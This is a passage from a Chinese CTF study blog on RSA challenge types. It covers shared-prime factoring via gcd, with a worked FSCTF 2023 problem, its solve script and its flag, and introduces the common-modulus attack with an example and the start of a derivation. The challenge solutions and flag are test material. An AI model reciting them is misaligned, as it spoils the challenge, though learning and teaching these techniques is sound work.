id="rsa简单题型"><a class="markdownIt-Anchor" href="#rsa简单题型"></a> RSA简单题型</h1><h2 id="直接解密"><a class="markdownIt-Anchor" href="#直接解密"></a> 直接解密</h2><h2 id="可分解n"><a class="markdownIt-Anchor" href="#可分解n"></a> 可分解n</h2><h2 id="泄露p-q关系式"><a class="markdownIt-Anchor" href="#泄露p-q关系式"></a> 泄露p、q关系式</h2><h2 id="低指数加密"><a class="markdownIt-Anchor" href="#低指数加密"></a> 低指数加密</h2><h2 id="共享素数"><a class="markdownIt-Anchor" href="#共享素数"></a> 共享素数</h2><h3 id="共享素数_题型总结"><a class="markdownIt-Anchor" href="#共享素数_题型总结"></a> 共享素数_题型总结</h3><ul><li><p>参考博客：<a href="https://mp.weixin.qq.com/s/F6isyS6omxCVLriFGAjWgg">https://mp.weixin.qq.com/s/F6isyS6omxCVLriFGAjWgg</a></p></li><li><p>这个也算是一个比较基础的题型，在<code>RSA</code>中，一个明文<code>m</code>分别被<code>n1</code>和<code>n2</code>进行RSA加密得到<code>c1</code>和<code>c2</code>，这两个加密<code>e</code>都是一样的。而<code>n1</code>和<code>n2</code>的生成过程和关系如下。（即，在<code>n1</code>和<code>n2</code>中有一个共同的素数p，可以表示为<code>(n1,n2)=p</code>）</p></li><li><p>在题目中一般都会给出<code>n1</code>和<code>n2</code>的值，当<code>n1</code>和<code>n2</code>已知，我们就可以使用<code>欧几里得算法</code>（也就是辗转相除法）将<code>n1</code>和<code>n2</code>的最大公因数求出来(在这种情况下<code>n1</code>和<code>n2</code>的最大公因数为<code>p</code>)</p></li><li><p>知道了<code>p</code>的值，我们就可以求得<code>q1=n1//p</code>、<code>q2=n2//p</code></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q1=getPrime(<span class="number">1024</span>)</span><br><span class="line">q2=getPrime(<span class="number">1024</span>)</span><br><span class="line">n1=p*q1</span><br><span class="line">n2=p*q2</span><br><span class="line">c1=<span class="built_in">pow</span>(m,e,n1)</span><br><span class="line">c2=<span class="built_in">pow</span>(m,e,n2)</span><br></pre></td></tr></table></figure><ul><li>在这种情况下就可以使用<code>python</code>中<code>gmpy2</code>库的<code>gcd</code>函数求的<code>p</code>，具体语法如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = xxxxx</span><br><span class="line">n2 = xxxxx</span><br><span class="line">p = gmpy2.gcd(n1,n2) <span class="comment"># 使用欧几里得算法求最大公因数</span></span><br></pre></td></tr></table></figure><ul><li>基本上就是这样的一个总结，关于<code>gcd</code>的实现对于数学计算请参考数论书，对于编程算法请参考算法书。这里只是对<code>gcd</code>进行简单使用。</li><li>如果单考<code>gcd</code>是非常基础的，这时<code>共享素数</code>的题目就会和其他知识点合起来一起考。</li></ul><h3 id="共享素数1"><a class="markdownIt-Anchor" href="#共享素数1"></a> 共享素数1</h3><ul><li>题目来源：[<a href="https://www.nssctf.cn/problem/4621">FSCTF 2023]Do you know gcd? | NSSCTF</a></li><li>题目附件如下：[FSCTF 2023]Do you know gcd?</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m1=bytes_to_long(flag[:<span class="number">16</span>])</span><br><span class="line">m2=bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q1=getPrime(<span class="number">1024</span>)</span><br><span class="line">q2=getPrime(<span class="number">1024</span>)</span><br><span class="line">n1=p*q1</span><br><span class="line">n2=p*q2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c1=<span class="built_in">pow</span>(m1,e,n1)</span><br><span class="line">c2=<span class="built_in">pow</span>(m2,e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1=&quot;</span>,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2=&quot;</span>,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1= 18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></span><br><span class="line"><span class="string">n2= 16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></span><br><span class="line"><span class="string">c1= 534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></span><br><span class="line"><span class="string">c2= 10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>这题就是比较典型的共享素数的题型，这边<code>n1=p*q1</code>和<code>n2=p*q2</code>，这样就有<code>gcd(n1,n2)=p</code>，所以<code>q1=n1//p</code>、<code>q2=n2//p</code>，之后就是正常的<code>RSA</code>解密了。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1= <span class="number">18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></span><br><span class="line">n2= <span class="number">16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></span><br><span class="line">c1= <span class="number">534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></span><br><span class="line">c2= <span class="number">10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">phi1= (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2= (p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d1 = gmpy2.invert(e,phi1)</span><br><span class="line">d2 = gmpy2.invert(e,phi2)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line">m1 = libnum.n2s(<span class="built_in">int</span>(m1))</span><br><span class="line">m2 = libnum.n2s(<span class="built_in">int</span>(m2))</span><br><span class="line">flag = m1+m2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># FSCTF&#123;0hN0_Y0u_f1nd_th3_gcd!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="求phin"><a class="markdownIt-Anchor" href="#求phin"></a> 求phi(n)</h2><h1 id="rsa中等题型"><a class="markdownIt-Anchor" href="#rsa中等题型"></a> RSA中等题型</h1><h2 id="rsa与同余"><a class="markdownIt-Anchor" href="#rsa与同余"></a> RSA与同余</h2><h2 id="e与phin不互素"><a class="markdownIt-Anchor" href="#e与phin不互素"></a> e与phi(n)不互素</h2><ul><li><code>e</code>与<code>phi(n)</code>不互素有三种题型，由难到易可以分为如下三个题型：<ul><li>最简单的题型就是有限域开方</li><li>之后特殊的情况就是当<code>e=2</code>的时候，有限域开方的这个方法会失效，这时可以使用<code>rabin</code>算法</li><li>这种题型最一般的解决方法就是使用<code>AMM</code>算法</li></ul></li><li>接下来就分别介绍这三种方法，注：中等题型基本上就是<strong>有限域开方</strong>，而<code>rabin</code>算法和<code>AMM</code>算法就是会放在困难题型中或者单独写一篇博客进行介绍。</li></ul><h3 id="有限域开方"><a class="markdownIt-Anchor" href="#有限域开方"></a> 有限域开方</h3><h3 id="特殊情况e2-rabin算法"><a class="markdownIt-Anchor" href="#特殊情况e2-rabin算法"></a> *特殊情况–e=2 rabin算法</h3><ul><li>当<code>e=2</code>的时候，开方的方法就失效了，这时需要使用一种特殊的算法来对结果进行修正，这就是<code>rabin</code>算法</li></ul><h3 id="amm算法"><a class="markdownIt-Anchor" href="#amm算法"></a> AMM算法</h3><h2 id="最小公因数和最大公倍数"><a class="markdownIt-Anchor" href="#最小公因数和最大公倍数"></a> 最小公因数和最大公倍数</h2><h2 id="共模攻击"><a class="markdownIt-Anchor" href="#共模攻击"></a> 共模攻击</h2><ul><li><p>参考：b站up风二西</p></li><li><p>最近学了一下共模攻击，共模攻击还是比较简单，也是比较模版的。</p></li><li><p>共模攻击是在特定条件下产生的：</p><ul><li>一个用户发送了两条消息，这两条消息的分别为<code>m1</code>和<code>m2</code></li><li>这两个消息用了同一个<code>n</code>，并且使用了<code>e1</code>和<code>e2</code>数作为指数</li><li>通过计算得到<code>c1 = m**e1 mod (n)</code>、<code>c2 = m**e2 mod (n)</code></li><li>这种题型就是RSA的共模攻击的题型</li></ul></li><li><p>一般题目就会给出如下信息：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">加密的密文c1、c2</span></span><br><span class="line"><span class="string">加密的指数e1、e2</span></span><br><span class="line"><span class="string">模数n</span></span><br><span class="line"><span class="string">下面给出一个例子</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e2 = getPrime(<span class="number">16</span>)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br></pre></td></tr></table></figure><ul><li>该题就是主要就是<code>gcd(e1,e2)</code>的三种情况，分别对应着共模攻击1、2、3：<ul><li>第一种情况，也是最简单的情况：<code>gcd(e1,e2)=1</code>。</li><li>第二种情况，稍微复杂一点：<code>gcd(e1,e2)≠1</code></li><li>第三种情况，也是最复杂的一种情况：<code>gcd(e1,e2)非常大</code></li></ul></li></ul><h3 id="共模攻击1"><a class="markdownIt-Anchor" href="#共模攻击1"></a> 共模攻击1</h3><ul><li>这个是最基本的题型，现在就给出一个例题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e2 = getPrime(<span class="number">16</span>)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gcd(e1,e2) =&quot;</span>,gmpy2.gcd(e1,e2))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = 35603</span></span><br><span class="line"><span class="string">e2 = 53849</span></span><br><span class="line"><span class="string">n = 65844835114811311147300780798656143825222359960203887804404336766671754915238143105361685751338600606205234241717554977556014391502151140599030174376626752597123335946780943028787393505875282845874194789937021373169837205020116739523929406808658690735666690634468817779530981170477446002242151051007841320499</span></span><br><span class="line"><span class="string">c1 = 3652946455096596922421828601712210382877573893656617028922252423601007198550547136141125408399184017530737069617361752419721283095525888153494847215557513043342658287550672860273427773994030007220020707376113461073627581510167395737557600247794396378096347654764650186631167120330986770904279007941507562441</span></span><br><span class="line"><span class="string">c2 = 16647423266182678960959947505427682046836995492595463854876112200789807987236540245845356081678424736418596164492737256401436506552449871347507391421521217966841767869954716106409257585276208800895615701515817235738827206889142921421410764420295206520038281264810899421047195121134469562492729516621808418924</span></span><br><span class="line"><span class="string">gcd(e1,e2) = 1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>先给出推导过程要用到的数论相关的定理</li></ul><details>    <summary>相关定理</summary><ul><li>首先是著名的裴蜀定理</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi><mo separator="true">,</mo><mtext>则存在</mtext><mi>s</mi><mo separator="true">,</mo><mi>t</mi><mo>∈</mo><mi>Z</mi><mtext>有</mtext><mi>a</mi><mi>s</mi><mo>+</mo><mi>b</mi><mi>t</mi><mo>=</mo><mi>d</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若(a,b)=d,则存在s,t∈Z有as+bt=d.\\\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">d</span><span class="mord">.</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>还有就是同余的基本运算，这里就不写出了。</li></ul></details><ul><li>接下来推导一下解密过程：</li></ul><details>    <summary>推导过程</summary><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>已知</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mn>2</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>n</mi></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}已知: \\c_1=m^{e_1}~~mod~(n)\\c_2=m^{e_2}~~mod~(n)\\gcd(e_1,e_2)=1\\e1,e2\\n\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.200000000000001em;vertical-align:-3.35em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.850000000000001em;"><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span><span style="top:-4.810000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-3.6100000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span><span style="top:-1.2100000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span 